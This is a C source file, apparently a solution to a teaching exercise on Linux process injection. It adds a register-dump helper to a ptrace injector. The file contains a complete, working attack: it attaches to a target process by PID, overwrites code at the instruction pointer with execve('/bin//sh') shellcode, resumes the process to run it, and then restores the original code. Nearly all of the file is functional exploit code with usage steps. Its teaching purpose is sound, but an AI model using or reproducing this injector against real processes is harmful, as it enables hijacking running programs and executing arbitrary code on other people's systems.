/*
 * exercise 4 solution
 * linux injection: register dump before payload injection
 * hack4.c
 * author: @cocomelonc
 *
 * base: 03-hacking-injection/hack.c
 *
 * change: add dump_regs() helper that prints the victim's CPU register
 * state immediately after PTRACE_GETREGS, before the payload is written.
 *
 * why this matters:
 *   - shows students the exact RIP value where the shellcode will land
 *   - demonstrates that ptrace gives full visibility into the tracee's
 *     CPU state: instruction pointer, stack pointer, arguments (rdi/rsi),
 *     and return value register (rax)
 *   - useful for debugging: if injection crashes the target, the register
 *     dump reveals where execution was at the moment of attachment
 *
 * struct user_regs_struct (from <sys/user.h>):
 *   defined for x86-64 Linux; contains all 16 general-purpose registers
 *   plus rip, rflags, cs, ss, ds, es, fs, gs.
 *   each field is __extension__ unsigned long long.
 *
 * compile:
 *   gcc hack4.c -o hack4
 *
 * usage:
 *   # terminal 1
 *   ./meow &
 *
 *   # terminal 2
 *   ./hack4 <PID>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

/* ── memory helpers (unchanged from original hack.c) ───────────────── */

void read_mem(pid_t pid, long addr, char *buf, int len) {
  union { long val; char bytes[sizeof(long)]; } chunk;
  int i = 0;
  while (i < len / (int)sizeof(long)) {
    chunk.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
    memcpy(buf + i * sizeof(long), chunk.bytes, sizeof(long));
    i++;
  }
  int rem = len % sizeof(long);
  if (rem) {
    chunk.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
    memcpy(buf + i * sizeof(long), chunk.bytes, rem);
  }
}

void write_mem(pid_t pid, long addr, char *buf, int len) {
  union { long val; char bytes[sizeof(long)]; } chunk;
  int i = 0;
  while (i < len / (int)sizeof(long)) {
    memcpy(chunk.bytes, buf + i * sizeof(long), sizeof(long));
    ptrace(PTRACE_POKEDATA, pid, addr + i * sizeof(long), chunk.val);
    i++;
  }
  int rem = len % sizeof(long);
  if (rem) {
    memcpy(chunk.bytes, buf + i * sizeof(long), rem);
    ptrace(PTRACE_POKEDATA, pid, addr + i * sizeof(long), chunk.val);
  }
}

/*
 * exercise 4 addition: dump_regs()
 *
 * prints the most instructive general-purpose registers from
 * struct user_regs_struct, formatted for easy reading.
 *
 * registers printed and why:
 *   RIP - instruction pointer: this is where the shellcode will be
 *          written and where execution will resume after PTRACE_CONT.
 *   RSP - stack pointer: shows the current top of the victim's stack.
 *   RAX - last syscall return value (or scratch register in user code).
 *   RBX - preserved register (non-volatile across calls in System V ABI).
 *   RCX - fourth argument / return address after syscall instruction.
 *   RDX - third argument register.
 *   RDI - first argument register (often holds fd, pid, or pointer).
 *   RSI - second argument register (often holds a buffer pointer).
 */
static void dump_regs(struct user_regs_struct *r) {
  printf("=== register dump (before injection) ===\n");
  printf("  RIP = 0x%016llx  <-- shellcode lands here\n", r->rip);
  printf("  RSP = 0x%016llx\n", r->rsp);
  printf("  RAX = 0x%016llx\n", r->rax);
  printf("  RBX = 0x%016llx\n", r->rbx);
  printf("  RCX = 0x%016llx\n", r->rcx);
  printf("  RDX = 0x%016llx\n", r->rdx);
  printf("  RDI = 0x%016llx\n", r->rdi);
  printf("  RSI = 0x%016llx\n", r->rsi);
  printf("=========================================\n");
}

/* original payload from hack.c: execve("/bin//sh") */
char payload[] =
  "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
  "\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

int main(int argc, char *argv[]) {
  if (argc != 2) {
    printf("usage: %s <target_pid>\n", argv[0]);
    return 1;
  }

  pid_t target_pid = (pid_t)atoi(argv[1]);
  int payload_len = sizeof(payload) - 1;
  char original_code[payload_len];
  struct user_regs_struct target_regs;

  printf("[*] attaching to process %d\n", target_pid);
  if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
    perror("[-] PTRACE_ATTACH failed");
    return 1;
  }
  waitpid(target_pid, NULL, 0);

  printf("[*] reading process registers\n");
  if (ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs) == -1) {
    perror("[-] PTRACE_GETREGS failed");
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    return 1;
  }

  /*
   * exercise 4 addition:
   * print registers immediately after PTRACE_GETREGS, before modifying
   * anything.  this is the snapshot of the victim at the moment we froze it.
   */
  dump_regs(&target_regs);

  printf("[*] backing up target memory at RIP\n");
  read_mem(target_pid, target_regs.rip, original_code, payload_len);

  printf("[*] injecting payload (%d bytes at 0x%llx)\n",
         payload_len, (unsigned long long)target_regs.rip);
  write_mem(target_pid, target_regs.rip, payload, payload_len);

  printf("[*] hijacking execution (PTRACE_CONT)\n");
  ptrace(PTRACE_CONT, target_pid, NULL, NULL);
  wait(NULL);

  printf("[*] restoring original process memory\n");
  write_mem(target_pid, target_regs.rip, original_code, payload_len);

  printf("[*] detaching\n");
  ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

  printf("[+] done\n");
  return 0;
}
